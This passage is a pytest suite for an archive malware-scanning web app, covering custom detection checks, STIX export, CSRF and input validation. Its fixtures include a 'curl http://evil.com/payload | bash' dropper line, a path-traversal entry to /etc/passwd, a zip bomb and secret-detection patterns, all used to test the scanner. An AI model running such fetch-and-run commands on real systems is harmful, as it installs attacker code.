        check = {"id": 3, "type": "regex", "pattern": r"AKIA[0-9A-Z]{16}",
                 "severity": "critical", "description": "AWS key", "name": "AWS", "enabled": 1}
        zf = _open_zip(_make_zip({"config.env": "AWS_KEY=AKIAIOSFODNN7EXAMPLE\n"}))
        findings = run_custom_checks(zf, [check])
        assert len(findings) == 1

    def test_regex_check_case_insensitive(self):
        check = {"id": 3, "type": "regex", "pattern": "password",
                 "severity": "medium", "description": "", "name": "P", "enabled": 1}
        zf = _open_zip(_make_zip({"config.env": "PASSWORD=hunter2"}))
        assert len(run_custom_checks(zf, [check])) == 1

    def test_regex_check_no_match(self):
        check = {"id": 3, "type": "regex", "pattern": r"AKIA[0-9A-Z]{16}",
                 "severity": "critical", "description": "", "name": "AWS", "enabled": 1}
        zf = _open_zip(_make_zip({"config.env": "KEY=nothing_here"}))
        assert run_custom_checks(zf, [check]) == []

    # ── filename ─────────────────────────────────────────────────────────────

    def test_filename_check_hit(self):
        check = {"id": 4, "type": "filename", "pattern": r"(crack|keygen)",
                 "severity": "medium", "description": "Social engineering", "name": "SE", "enabled": 1}
        zf = _open_zip(_make_zip({"keygen_v2.exe": "x", "readme.txt": "y"}))
        findings = run_custom_checks(zf, [check])
        assert len(findings) == 1
        assert "keygen" in findings[0].filename

    def test_filename_check_no_match(self):
        check = {"id": 4, "type": "filename", "pattern": r"crack",
                 "severity": "medium", "description": "", "name": "SE", "enabled": 1}
        zf = _open_zip(_make_zip({"legitimate_installer.exe": "x"}))
        assert run_custom_checks(zf, [check]) == []

    def test_multiple_checks_multiple_hits(self):
        checks = [
            {"id": 1, "type": "extension", "pattern": ".sh",
             "severity": "high", "description": "", "name": "SH", "enabled": 1},
            {"id": 2, "type": "string", "pattern": "curl http",
             "severity": "medium", "description": "", "name": "Curl", "enabled": 1},
        ]
        zf = _open_zip(_make_zip({
            "dropper.sh": "curl http://evil.com/payload | bash",
            "readme.txt": "nothing",
        }))
        findings = run_custom_checks(zf, checks)
        check_names = {f.check for f in findings}
        assert "custom_1" in check_names
        assert "custom_2" in check_names


# ═══════════════════════════════════════════════════════════════════════════════
# STIX / NAVIGATOR EXPORT FUNCTIONS
# ═══════════════════════════════════════════════════════════════════════════════

class TestStixExport:
    def _scan(self, **kw):
        r = _make_result(**kw)
        r["id"] = 1
        return r

    def test_stix_bundle_structure(self):
        bundle = to_stix_bundle(self._scan())
        assert bundle["type"] == "bundle"
        assert bundle["spec_version"] == "2.1"
        assert isinstance(bundle["objects"], list)

    def test_stix_has_identity(self):
        bundle = to_stix_bundle(self._scan())
        types = [o["type"] for o in bundle["objects"]]
        assert "identity" in types

    def test_stix_malware_when_unsafe(self):
        bundle = to_stix_bundle(self._scan(safe=False))
        types = [o["type"] for o in bundle["objects"]]
        assert "malware" in types

    def test_stix_no_malware_when_safe(self):
        bundle = to_stix_bundle(self._scan(safe=True, risk=0))
        types = [o["type"] for o in bundle["objects"]]
        assert "malware" not in types

    def test_stix_ip_indicator_present(self):
        bundle = to_stix_bundle(self._scan())
        indicators = [o for o in bundle["objects"] if o["type"] == "indicator"]
        assert any("1.2.3.4" in i["pattern"] for i in indicators)

    def test_stix_url_indicator_present(self):
        bundle = to_stix_bundle(self._scan())
        indicators = [o for o in bundle["objects"] if o["type"] == "indicator"]
        assert any("evil.example.com" in i["pattern"] for i in indicators)

    def test_stix_hash_indicator_present(self):
        bundle = to_stix_bundle(self._scan())
        indicators = [o for o in bundle["objects"] if o["type"] == "indicator"]
        assert any("SHA-256" in i["pattern"] for i in indicators)

    def test_navigator_structure(self):
        layer = to_navigator_layer(self._scan())
        assert "techniques" in layer
        assert "domain" in layer
        assert layer["domain"] == "enterprise-attack"

    def test_navigator_technique_ids(self):
        layer = to_navigator_layer(self._scan(mitre=[{"id": "T1055", "name": "Process Injection"}]))
        ids = [t["techniqueID"] for t in layer["techniques"]]
        assert "T1055" in ids

    def test_navigator_empty_techniques(self):
        layer = to_navigator_layer(self._scan(mitre=[]))
        assert layer["techniques"] == []


# ═══════════════════════════════════════════════════════════════════════════════
# SECURITY — CSRF, INPUT VALIDATION, HEADER HARDENING
# ═══════════════════════════════════════════════════════════════════════════════

class TestSecurityHeaders:
    """Every response must include the full security header set."""

    def test_x_content_type_options(self, client):
        r = client.get("/")
        assert r.headers.get("X-Content-Type-Options") == "nosniff"

    def test_x_frame_options(self, client):
        r = client.get("/")
        assert r.headers.get("X-Frame-Options") == "DENY"

    def test_referrer_policy(self, client):
        r = client.get("/")
        assert r.headers.get("Referrer-Policy") == "no-referrer"

    def test_csp_present(self, client):
        r = client.get("/")
        assert "Content-Security-Policy" in r.headers

    def test_csp_no_unsafe_eval(self, client):
        r = client.get("/")
        assert "unsafe-eval" not in r.headers.get("Content-Security-Policy", "")

    def test_permissions_policy(self, client):
        r = client.get("/")
        assert "Permissions-Policy" in r.headers

    def test_cross_domain_policies(self, client):
        r = client.get("/")
        assert r.headers.get("X-Permitted-Cross-Domain-Policies") == "none"

    def test_headers_on_api_responses(self, client):
        r = client.get("/api/scans")
        assert r.headers.get("X-Content-Type-Options") == "nosniff"


class TestCsrfGuard:
    """Requests with a cross-origin Origin or form-encoded body must be rejected."""

    def _post_json(self, client, url, body=None, **extra):
        return client.post(
            url,
            data=json.dumps(body or {}),
            content_type="application/json",
            **extra,
        )

    def test_cross_origin_rejected(self, client):
        r = self._post_json(
            client, "/api/custom-checks",
            body={"name": "x", "type": "string", "pattern": "x", "severity": "low"},
            headers={"Origin": "https://evil.example.com"},
        )
        assert r.status_code == 403

    def test_cross_origin_referer_rejected(self, client):
        r = self._post_json(
            client, "/api/custom-checks",
            body={"name": "x", "type": "string", "pattern": "x", "severity": "low"},
            headers={"Referer": "https://evil.example.com/attack.html"},
        )
        assert r.status_code == 403

    def test_form_urlencoded_rejected(self, client):
        r = client.post(
            "/api/custom-checks",
            data="name=x&type=string&pattern=x&severity=low",
            content_type="application/x-www-form-urlencoded",
        )
        assert r.status_code == 403

    def test_localhost_origin_allowed(self, client):
        r = self._post_json(
            client, "/api/custom-checks",
            body={"name": "x", "type": "string", "pattern": "x", "severity": "low"},
            headers={"Origin": "http://localhost:5000"},
        )
        assert r.status_code == 200

    def test_no_origin_no_referer_allowed(self, client):
        """curl-style requests with no Origin/Referer must be allowed."""
        r = self._post_json(
            client, "/api/custom-checks",
            body={"name": "x", "type": "string", "pattern": "x", "severity": "low"},
        )
        assert r.status_code == 200

    def test_csrf_on_delete_scan(self, client):
        """Cross-origin DELETE must also be blocked."""
        scan_id = database.save_scan(_make_result())
        r = client.delete(
            f"/api/scans/{scan_id}",
            content_type="application/x-www-form-urlencoded",
        )
        assert r.status_code == 403

    def test_csrf_on_patch_scan(self, client):
        scan_id = database.save_scan(_make_result())
        r = client.patch(
            f"/api/scans/{scan_id}",
            data="notes=pwned",
            content_type="application/x-www-form-urlencoded",
        )
        assert r.status_code == 403


class TestInputValidation:
    """Verify bounds-checking and sanitisation on all mutating API endpoints."""

    def _post_json(self, client, url, body):
        return client.post(url, data=json.dumps(body), content_type="application/json")

    def _patch_json(self, client, url, body):
        return client.patch(url, data=json.dumps(body), content_type="application/json")

    # ── /api/scans ────────────────────────────────────────────────────────────

    def test_negative_offset_clamped(self, client):
        """Negative offset must not reach SQLite as-is."""
        r = client.get("/api/scans?offset=-99")
        assert r.status_code == 200  # clamped to 0, not rejected

    def test_notes_too_long(self, client):
        scan_id = database.save_scan(_make_result())
        r = self._patch_json(client, f"/api/scans/{scan_id}", {"notes": "x" * 10_001})
        assert r.status_code == 400

    def test_notes_max_length_ok(self, client):
        scan_id = database.save_scan(_make_result())
        r = self._patch_json(client, f"/api/scans/{scan_id}", {"notes": "x" * 10_000})
        assert r.status_code == 200

    def test_invalid_status_rejected(self, client):
        scan_id = database.save_scan(_make_result())
        r = self._patch_json(client, f"/api/scans/{scan_id}", {"status": "malicious"})
        assert r.status_code == 400

    # ── /api/ioc-pivot ───────────────────────────────────────────────────────

    def test_ioc_pivot_too_short(self, client):
        r = client.get("/api/ioc-pivot?q=ab")
        assert r.status_code == 400

    def test_ioc_pivot_wildcard_only_rejected(self, client):
        r = client.get("/api/ioc-pivot?q=%%%")
        assert r.status_code == 400

    def test_ioc_pivot_mixed_wildcards_too_few_real_chars(self, client):
        """"%ab%" has only 2 non-wildcard chars — must be rejected."""
        r = client.get("/api/ioc-pivot?q=%ab%")
        assert r.status_code == 400

    def test_ioc_pivot_valid_query(self, client):
        r = client.get("/api/ioc-pivot?q=192.168.1")
        assert r.status_code == 200

    # ── /api/custom-checks ReDoS ─────────────────────────────────────────────

    def test_regex_pattern_too_long(self, client):
        r = self._post_json(client, "/api/custom-checks", {
            "name": "x", "type": "regex", "severity": "low",
            "pattern": "a" * 1_001,
        })
        assert r.status_code == 400

    def test_nested_quantifier_rejected(self, client):
        """(a+)+ is a textbook ReDoS pattern — must be rejected."""
        r = self._post_json(client, "/api/custom-checks", {
            "name": "x", "type": "regex", "severity": "low",
            "pattern": "(a+)+",
        })
        assert r.status_code == 400

    def test_nested_quantifier_star_rejected(self, client):
        r = self._post_json(client, "/api/custom-checks", {
            "name": "x", "type": "regex", "severity": "low",
            "pattern": "([a-z]*)+",
        })
        assert r.status_code == 400

    def test_valid_regex_accepted(self, client):
        r = self._post_json(client, "/api/custom-checks", {
            "name": "x", "type": "regex", "severity": "low",
            "pattern": r"\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}",
        })
        assert r.status_code == 200

    def test_invalid_regex_rejected(self, client):
        r = self._post_json(client, "/api/custom-checks", {
            "name": "x", "type": "regex", "severity": "low",
            "pattern": "(unclosed",
        })
        assert r.status_code == 400

    def test_non_regex_pattern_no_length_limit_enforced(self, client):
        """Non-regex patterns use the 4 000-char general limit."""
        r = self._post_json(client, "/api/custom-checks", {
            "name": "x", "type": "string", "severity": "low",
            "pattern": "a" * 4_001,
        })
        assert r.status_code == 400

    # ── /api/yara-test ───────────────────────────────────────────────────────

    def test_yara_rule_too_large(self, client):
        # Fill with non-whitespace so .strip() doesn't shrink it
        huge_rule = "// " + "a" * 65_534
        r = self._post_json(client, "/api/yara-test", {"rule": huge_rule})
        assert r.status_code == 400

    def test_yara_rule_valid_compiles(self, client):
        rule = "rule ok { condition: false }"
        r = self._post_json(client, "/api/yara-test", {"rule": rule})
        assert r.status_code == 200
        assert r.get_json()["compiled"] is True

    def test_yara_rule_compile_error(self, client):
        r = self._post_json(client, "/api/yara-test", {"rule": "this is not yara"})
        assert r.status_code == 400

    # ── /api/yara-drafts ─────────────────────────────────────────────────────

    def test_yara_draft_too_large_on_create(self, client):
        r = self._post_json(client, "/api/yara-drafts", {
            "name": "big", "content": "x" * 65_537,
        })
        assert r.status_code == 400

    def test_yara_draft_valid_create(self, client):
        r = self._post_json(client, "/api/yara-drafts", {
            "name": "test", "content": "rule ok { condition: false }",
        })
        assert r.status_code == 200
        assert "id" in r.get_json()

    def test_yara_draft_too_large_on_update(self, client):
        # Create a draft first
        cr = self._post_json(client, "/api/yara-drafts", {"name": "t", "content": "x"})
        draft_id = cr.get_json()["id"]
        r = self._patch_json(client, f"/api/yara-drafts/{draft_id}", {
            "content": "x" * 65_537,
        })
        assert r.status_code == 400


# ═══════════════════════════════════════════════════════════════════════════════
# PENTEST — TYPE CONFUSION, PARAMETER SAFETY, WATCH FOLDER RESTRICTION
# ═══════════════════════════════════════════════════════════════════════════════

class TestTypeConfusion:
    """Non-string values for string fields must never cause 500s."""

    def _post_json(self, client, url, body):
        return client.post(url, data=json.dumps(body), content_type="application/json")

    def _patch_json(self, client, url, body):
        return client.patch(url, data=json.dumps(body), content_type="application/json")

    def test_custom_check_array_name(self, client):
        r = self._post_json(client, "/api/custom-checks",
                            {"name": ["arr"], "type": "string", "pattern": "x", "severity": "low"})
        assert r.status_code == 400

    def test_custom_check_dict_pattern(self, client):
        r = self._post_json(client, "/api/custom-checks",
                            {"name": "ok", "type": "string", "pattern": {"k": "v"}, "severity": "low"})
        assert r.status_code == 400

    def test_custom_check_int_severity_defaults(self, client):
        """Non-string severity coerces to default 'medium' — check still created."""
        r = self._post_json(client, "/api/custom-checks",
                            {"name": "ok", "type": "string", "pattern": "x", "severity": 42})
        assert r.status_code == 200

    def test_yara_rule_as_array(self, client):
        r = self._post_json(client, "/api/yara-test", {"rule": [1, 2, 3]})
        assert r.status_code == 400

    def test_yara_draft_body_as_json_array(self, client):
        r = client.post("/api/yara-drafts",
                        data="[1,2,3]", content_type="application/json")
        assert r.status_code == 200

    def test_yara_draft_name_as_integer(self, client):
        """Integer name should be treated as empty → default to 'Untitled'."""
        r = self._post_json(client, "/api/yara-drafts",
                            {"name": 9999, "content": "rule ok { condition: false }"})
        assert r.status_code == 200

    def test_yara_draft_content_as_list(self, client):
        r = self._post_json(client, "/api/yara-drafts",
                            {"name": "x", "content": [1, 2, 3]})
        # content defaults to "" — still creates draft
        assert r.status_code == 200

    def test_yara_draft_update_content_as_dict(self, client):
        cr = self._post_json(client, "/api/yara-drafts", {"name": "t", "content": "x"})
        did = cr.get_json()["id"]
        r = self._patch_json(client, f"/api/yara-drafts/{did}", {"content": {"bad": True}})
        assert r.status_code == 400

    def test_notes_as_list(self, client):
        sid = database.save_scan(_make_result())
        r = self._patch_json(client, f"/api/scans/{sid}", {"notes": ["a", "b"]})
        assert r.status_code == 400

    def test_notes_as_integer(self, client):
        sid = database.save_scan(_make_result())
        r = self._patch_json(client, f"/api/scans/{sid}", {"notes": 12345})
        assert r.status_code == 400

    def test_status_as_integer(self, client):
        sid = database.save_scan(_make_result())
        r = self._patch_json(client, f"/api/scans/{sid}", {"status": 0})
        assert r.status_code == 400


class TestParameterSafety:
    """Query parameters with non-integer values must be safely clamped, not crash."""

    def test_limit_string(self, client):
        assert client.get("/api/scans?limit=abc").status_code == 200

    def test_offset_string(self, client):
        assert client.get("/api/scans?offset=xyz").status_code == 200

    def test_limit_scientific_notation(self, client):
        assert client.get("/api/scans?limit=1e10").status_code == 200

    def test_offset_float(self, client):
        assert client.get("/api/scans?offset=1.5").status_code == 200

    def test_limit_negative(self, client):
        assert client.get("/api/scans?limit=-1").status_code == 200

    def test_offset_negative_clamped(self, client):
        r = client.get("/api/scans?offset=-999")
        assert r.status_code == 200

    def test_limit_max_clamped(self, client):
        """limit > 500 must be silently clamped, not crash."""
        r = client.get("/api/scans?limit=9999999")
        assert r.status_code == 200


class TestWatchFolderSecurity:
    """Watch folder must reject system directories and path traversal."""

    def _add(self, client, path):
        return client.post("/api/watch-folders",
                           data=json.dumps({"path": path}),
                           content_type="application/json")

    def test_etc_rejected(self, client):
        assert self._add(client, "/etc").status_code == 400

    def test_usr_rejected(self, client):
        assert self._add(client, "/usr").status_code == 400

    def test_dev_rejected(self, client):
        assert self._add(client, "/dev").status_code == 400

    def test_path_traversal_to_etc(self, client):
        assert self._add(client, "/tmp/../etc").status_code == 400

    def test_root_rejected(self, client):
        assert self._add(client, "/").status_code == 400

    def test_valid_tmpdir_accepted(self, client, tmp_path):
        assert self._add(client, str(tmp_path)).status_code == 200

    def test_scan_error_no_path_leak(self, client, tmp_path):
        """OSError during scan must not include filesystem path in response."""
        fid = self._add(client, str(tmp_path)).get_json()["id"]
        # Remove the directory so scandir fails
        import shutil
        shutil.rmtree(str(tmp_path))
        r = client.post(f"/api/watch-folders/{fid}/scan",
                        data="{}", content_type="application/json")
        assert str(tmp_path) not in r.get_data(as_text=True)


# ═══════════════════════════════════════════════════════════════════════════════
# FILE UPLOAD PIPELINE  (/analyze)
# ═══════════════════════════════════════════════════════════════════════════════

def _zip_bytes(files: dict) -> bytes:
    """Build an in-memory zip. files = {name: content (str or bytes)}."""
    buf = io.BytesIO()
    with zipfile.ZipFile(buf, "w", compression=zipfile.ZIP_DEFLATED) as zf:
        for name, content in files.items():
            zf.writestr(name, content)
    return buf.getvalue()


def _tar_bytes(files: dict, suffix=".tar") -> bytes:
    buf = io.BytesIO()
    mode = "w:gz" if suffix in (".tgz", ".tar.gz") else "w:"
    with tarfile.open(fileobj=buf, mode=mode) as tf:
        for name, content in files.items():
            data = content.encode() if isinstance(content, str) else content
            ti = tarfile.TarInfo(name=name)
            ti.size = len(data)
            tf.addfile(ti, io.BytesIO(data))
    return buf.getvalue()


def _upload(client, file_bytes, filename="test.zip"):
    return client.post(
        "/analyze",
        data={"file": (io.BytesIO(file_bytes), filename)},
        content_type="multipart/form-data",
    )


class TestFileUpload:

    def test_valid_zip_returns_200(self, client):
        r = _upload(client, _zip_bytes({"readme.txt": "hello"}))
        assert r.status_code == 200
        body = r.get_json()
        assert "findings" in body
        assert "safe" in body
        assert "filesize" in body

    def test_scan_saved_to_history(self, client):
        _upload(client, _zip_bytes({"readme.txt": "ok"}))
        scans = client.get("/api/scans").get_json()
        assert len(scans) == 1

    def test_dangerous_extension_detected(self, client):
        r = _upload(client, _zip_bytes({"payload.exe": b"\x4d\x5a" + b"\x00" * 10}))
        body = r.get_json()
        checks = {f["check"] for f in body["findings"]}
        assert "dangerous_extension" in checks

    def test_path_traversal_detected(self, client):
        buf = io.BytesIO()
        with zipfile.ZipFile(buf, "w") as zf:
            info = zipfile.ZipInfo("../../../etc/passwd")
            zf.writestr(info, "root:x:0:0")
        r = _upload(client, buf.getvalue())
        body = r.get_json()
        checks = {f["check"] for f in body["findings"]}
        assert "path_traversal" in checks

    def test_zip_bomb_ratio_detected(self, client):
        """File of 50 000 null bytes compresses to ~50 bytes → ratio ~1000:1."""
        r = _upload(client, _zip_bytes({"bomb.txt": b"\x00" * 50_000}))
        body = r.get_json()
        checks = {f["check"] for f in body["findings"]}
        assert "zip_bomb" in checks

    def test_malformed_zip_returns_200_with_error(self, client):
        """Corrupt uploads must not 500 — analyzer returns an error result."""
        r = _upload(client, b"this is not a zip file PK garbage")
        assert r.status_code == 200
        body = r.get_json()
        # Either an error field is set or findings are empty — either is acceptable
        assert body.get("error") or body.get("findings") is not None

    def test_unknown_extension_rejected(self, client):
        r = _upload(client, b"data", filename="malware.exe")
        assert r.status_code == 400

    def test_no_file_part_rejected(self, client):
        r = client.post("/analyze", data={}, content_type="multipart/form-data")
        assert r.status_code == 400

    def test_empty_filename_rejected(self, client):
        r = client.post(
            "/analyze",
            data={"file": (io.BytesIO(b"x"), "")},
            content_type="multipart/form-data",
        )
        assert r.status_code == 400

    def test_tar_upload_analysed(self, client):
        r = _upload(client, _tar_bytes({"readme.txt": "ok"}), filename="archive.tar")
        assert r.status_code == 200
        assert "findings" in r.get_json()

    def test_tgz_upload_analysed(self, client):
        r = _upload(client, _tar_bytes({"f.txt": "x"}, suffix=".tgz"), filename="archive.tgz")
        assert r.status_code == 200

    def test_custom_check_applied_during_scan(self, client):
        """A saved custom check must fire when the archive contains a match."""
        client.post(
            "/api/custom-checks",
            data=json.dumps({"name": "find-secret", "type": "string",
                             "pattern": "BEGIN RSA PRIVATE KEY", "severity": "critical"}),
            content_type="application/json",
        )
        r = _upload(client, _zip_bytes({"key.txt": "-----BEGIN RSA PRIVATE KEY-----"}))
        body = r.get_json()
        custom_hits = [f for f in body["findings"] if f["check"].startswith("custom_")]
        assert len(custom_hits) >= 1
        assert custom_hits[0]["severity"] == "critical"

    def test_response_has_finding_counts(self, client):
        r = _upload(client, _zip_bytes({"ok.txt": "safe content"}))
        body = r.get_json()
        assert set(body["finding_counts"].keys()) == {"critical", "high", "medium", "low", "info"}

    def test_response_has_metrics(self, client):
        r = _upload(client, _zip_bytes({"ok.txt": "safe"}))
        body = r.get_json()
        assert "metrics" in body


# ═══════════════════════════════════════════════════════════════════════════════
# CUSTOM CHECKS API — CRUD
# ═══════════════════════════════════════════════════════════════════════════════

class TestCustomChecksApi:

    def _create(self, client, **kw):
        defaults = {"name": "test", "type": "string", "pattern": "evil", "severity": "high"}
        defaults.update(kw)
        return client.post(
            "/api/custom-checks",
            data=json.dumps(defaults),
            content_type="application/json",
        )

    def test_list_empty(self, client):
        r = client.get("/api/custom-checks")
        assert r.status_code == 200
        assert r.get_json() == []

    def test_create_returns_id(self, client):
        r = self._create(client)
        assert r.status_code == 200
        assert "id" in r.get_json()

    def test_create_appears_in_list(self, client):
        self._create(client, name="my-check")
        checks = client.get("/api/custom-checks").get_json()
        assert any(c["name"] == "my-check" for c in checks)

    def test_create_missing_name_rejected(self, client):
        r = self._create(client, name="")
        assert r.status_code == 400

    def test_create_missing_pattern_rejected(self, client):
        r = self._create(client, pattern="")
        assert r.status_code == 400

    def test_create_invalid_type_rejected(self, client):
        r = self._create(client, type="glob")
        assert r.status_code == 400

    def test_create_invalid_severity_rejected(self, client):
        r = self._create(client, severity="nuclear")
        assert r.status_code == 400

    def test_delete_removes_check(self, client):
        check_id = self._create(client).get_json()["id"]
        r = client.delete(
            f"/api/custom-checks/{check_id}",
            content_type="application/json",
        )
        assert r.status_code == 200
        assert all(c["id"] != check_id for c in client.get("/api/custom-checks").get_json())

    def test_toggle_disables_check(self, client):
        check_id = self._create(client).get_json()["id"]
        client.post(
            f"/api/custom-checks/{check_id}/toggle",
            data=json.dumps({"enabled": False}),
            content_type="application/json",
        )
        checks = client.get("/api/custom-checks").get_json()
        match = next(c for c in checks if c["id"] == check_id)
        assert match["enabled"] == 0

    def test_toggle_re_enables_check(self, client):
        check_id = self._create(client).get_json()["id"]
        for enabled in (False, True):
            client.post(
                f"/api/custom-checks/{check_id}/toggle",
                data=json.dumps({"enabled": enabled}),
                content_type="application/json",
            )
        match = next(c for c in client.get("/api/custom-checks").get_json()
                     if c["id"] == check_id)
        assert match["enabled"] == 1

    def test_all_valid_severities_accepted(self, client):
        for sev in ("critical", "high", "medium", "low", "info"):
            r = self._create(client, name=f"sev-{sev}", severity=sev)
            assert r.status_code == 200

    def test_all_valid_types_accepted(self, client):
        for t in ("string", "extension", "filename"):
            r = self._create(client, name=f"type-{t}", type=t, pattern=".sh" if t == "extension" else "x")
            assert r.status_code == 200


# ═══════════════════════════════════════════════════════════════════════════════
# YARA DRAFTS API — CRUD
# ═══════════════════════════════════════════════════════════════════════════════

class TestYaraDraftsApi:

    def _create(self, client, name="test", content="rule ok { condition: false }"):
        return client.post(
            "/api/yara-drafts",
            data=json.dumps({"name": name, "content": content}),
            content_type="application/json",
        )

    def test_list_empty(self, client):
        assert client.get("/api/yara-drafts").get_json() == []

    def test_create_and_list(self, client):
        self._create(client, name="my-rule")
        drafts = client.get("/api/yara-drafts").get_json()
        assert any(d["name"] == "my-rule" for d in drafts)

    def test_create_returns_id(self, client):
        r = self._create(client)
        assert r.status_code == 200
        assert "id" in r.get_json()

    def test_update_content(self, client):
        draft_id = self._create(client).get_json()["id"]
        new_content = "rule updated { condition: true }"
        r = client.patch(
            f"/api/yara-drafts/{draft_id}",
            data=json.dumps({"content": new_content}),
            content_type="application/json",
        )
        assert r.status_code == 200
        drafts = client.get("/api/yara-drafts").get_json()
        match = next(d for d in drafts if d["id"] == draft_id)
        assert match["content"] == new_content

    def test_delete_removes_draft(self, client):
        draft_id = self._create(client).get_json()["id"]
        client.delete(f"/api/yara-drafts/{draft_id}", content_type="application/json")
        assert all(d["id"] != draft_id for d in client.get("/api/yara-drafts").get_json())

    def test_empty_name_defaults_to_untitled(self, client):
        r = client.post(
            "/api/yara-drafts",
            data=json.dumps({"name": "", "content": "x"}),
            content_type="application/json",
        )
        assert r.status_code == 200
        drafts = client.get("/api/yara-drafts").get_json()
        assert any(d["name"] == "Untitled" for d in drafts)


# ═══════════════════════════════════════════════════════════════════════════════
# WATCH FOLDER API
# ═══════════════════════════════════════════════════════════════════════════════

class TestWatchFolderApi:

    def test_list_empty(self, client):
        assert client.get("/api/watch-folders").get_json() == []

    def test_add_valid_path(self, client, tmp_path):
        r = client.post(
            "/api/watch-folders",
            data=json.dumps({"path": str(tmp_path)}),
            content_type="application/json",
        )
        assert r.status_code == 200
        assert "id" in r.get_json()

    def test_add_valid_path_appears_in_list(self, client, tmp_path):
        client.post(
            "/api/watch-folders",
            data=json.dumps({"path": str(tmp_path)}),
            content_type="application/json",
        )
        folders = client.get("/api/watch-folders").get_json()
        assert any(f["path"] == str(tmp_path) for f in folders)

    def test_add_nonexistent_path_rejected(self, client):
        r = client.post(
            "/api/watch-folders",
            data=json.dumps({"path": "/nonexistent/path/that/does/not/exist"}),
            content_type="application/json",
        )
        assert r.status_code == 400

    def test_add_missing_path_rejected(self, client):
        r = client.post(
            "/api/watch-folders",
            data=json.dumps({}),
            content_type="application/json",
        )
        assert r.status_code == 400

    def test_delete_watch_folder(self, client, tmp_path):
        folder_id = client.post(
            "/api/watch-folders",
            data=json.dumps({"path": str(tmp_path)}),
            content_type="application/json",
        ).get_json()["id"]
        r = client.delete(
            f"/api/watch-folders/{folder_id}",
            content_type="application/json",
        )
        assert r.status_code == 200
        assert all(f["id"] != folder_id for f in client.get("/api/watch-folders").get_json())

    def test_toggle_watch_folder(self, client, tmp_path):
        folder_id = client.post(
            "/api/watch-folders",
            data=json.dumps({"path": str(tmp_path)}),
            content_type="application/json",
        ).get_json()["id"]
        client.post(
            f"/api/watch-folders/{folder_id}/toggle",
            data=json.dumps({"enabled": False}),
            content_type="application/json",
        )
        folders = client.get("/api/watch-folders").get_json()
        match = next(f for f in folders if f["id"] == folder_id)
        assert match["enabled"] == 0


# ═══════════════════════════════════════════════════════════════════════════════
# CAMPAIGN CLUSTERING
# ═══════════════════════════════════════════════════════════════════════════════

class TestCampaignClustering:

    def _scan_with_ip(self, ip: str):
        """Build a minimal scan result dict containing a specific IP."""
        return {
            "filename": f"scan_{ip}.zip",
            "filesize": 512,
            "safe": False,
            "error": None,
            "max_severity": "high",
            "finding_counts": {"critical": 0, "high": 1, "medium": 0, "low": 0, "info": 0},
            "findings": [],
            "metrics": {
                "risk_score": 50,
                "risk_label": "HIGH",
                "confidence": 80,
                "mitre_techniques": [],
                "ioc_summary": {
                    "ips":    [{"ip": ip, "type": "public"}],
                    "urls":   [],
                    "onions": [],
                    "total":  1,
                },
                "file_hashes": [],
            },
        }

    def test_no_campaigns_with_single_scan(self, client):
        database.save_scan(self._scan_with_ip("10.0.0.1"))
        campaigns = client.get("/api/campaigns").get_json()
        assert campaigns == []

    def test_shared_ip_creates_campaign(self, client):
        database.save_scan(self._scan_with_ip("1.2.3.4"))
        database.save_scan(self._scan_with_ip("1.2.3.4"))
        campaigns = client.get("/api/campaigns").get_json()
        assert len(campaigns) >= 1
        indicators = {c["indicator"] for c in campaigns}
        assert "1.2.3.4" in indicators

    def test_different_ips_no_campaign(self, client):
        database.save_scan(self._scan_with_ip("10.0.0.1"))
        database.save_scan(self._scan_with_ip("10.0.0.2"))
        campaigns = client.get("/api/campaigns").get_json()
        assert campaigns == []

    def test_campaign_has_expected_fields(self, client):
        database.save_scan(self._scan_with_ip("5.5.5.5"))
        database.save_scan(self._scan_with_ip("5.5.5.5"))
        campaign = client.get("/api/campaigns").get_json()[0]
        assert "indicator" in campaign
        assert "scan_count" in campaign
        assert "scans" in campaign
        assert campaign["scan_count"] == 2


# ═══════════════════════════════════════════════════════════════════════════════
# IOC PIVOT WITH REAL DATA
# ═══════════════════════════════════════════════════════════════════════════════

class TestIocPivot:

    def _save_scan_with_url(self, url):
        return database.save_scan({
            "filename": "test.zip", "filesize": 100, "safe": False, "error": None,
            "max_severity": "high",
            "finding_counts": {"critical": 0, "high": 1, "medium": 0, "low": 0, "info": 0},
            "findings": [],
            "metrics": {
                "risk_score": 40, "risk_label": "HIGH", "confidence": 90,
                "mitre_techniques": [],
                "ioc_summary": {"ips": [], "urls": [url], "onions": [], "total": 1},
                "file_hashes": [],
            },
        })

    def test_pivot_finds_matching_url(self, client):
        self._save_scan_with_url("https://evil.example.com/payload")
        r = client.get("/api/ioc-pivot?q=evil.example")
        assert r.status_code == 200
        results = r.get_json()
        assert len(results) >= 1
        assert any("evil.example" in item["value"] for item in results)

    def test_pivot_returns_empty_for_nonmatch(self, client):
        self._save_scan_with_url("https://good.example.com/safe")
        r = client.get("/api/ioc-pivot?q=definitely.not.there")
        assert r.status_code == 200
        assert r.get_json() == []

    def test_pivot_result_has_scan_id(self, client):
        sid = self._save_scan_with_url("https://track.me/c2")
        r = client.get("/api/ioc-pivot?q=track.me")
        results = r.get_json()
        assert any(item["scan_id"] == sid for item in results)


# ═══════════════════════════════════════════════════════════════════════════════
# GENERATOR TOOL DATA INTEGRITY
# ═══════════════════════════════════════════════════════════════════════════════

class TestGeneratorDataIntegrity:
    """Quality gate: every tool in TOOLS must meet the minimum data bar."""

    @pytest.fixture(autouse=True)
    def _load(self):
        from zip_analyzer.tool_data import TOOLS, TOOLS_BY_SLUG
        self.tools = TOOLS
        self.by_slug = TOOLS_BY_SLUG

    def test_no_duplicate_slugs(self):
        slugs = [t["slug"] for t in self.tools]
        assert len(slugs) == len(set(slugs)), "Duplicate slugs found"

    def test_tools_by_slug_covers_all_tools(self):
        for tool in self.tools:
            assert tool["slug"] in self.by_slug

    def test_all_colors_valid_hex(self):
        _COLOR_RE = re.compile(r"^#[0-9a-fA-F]{6}$")
        bad = [t["slug"] for t in self.tools if not _COLOR_RE.match(t.get("color", ""))]
        assert bad == [], f"Invalid colors on: {bad}"

    def test_every_tool_has_at_least_one_section(self):
        bad = [t["slug"] for t in self.tools if not t.get("sections")]
        assert bad == [], f"Tools with no sections: {bad}"

    def test_every_tool_has_at_least_one_preset(self):
        bad = [t["slug"] for t in self.tools if not t.get("presets")]
        assert bad == [], f"Tools with no presets: {bad}"

    def test_every_tool_has_required_fields(self):
        required = {"slug", "name", "category", "tier", "color", "desc",
                    "sections", "presets"}
        for tool in self.tools:
            missing = required - set(tool.keys())
            assert not missing, f"{tool['slug']} missing: {missing}"

    def test_tier_values_valid(self):
        valid_tiers = {1, 2, 3}
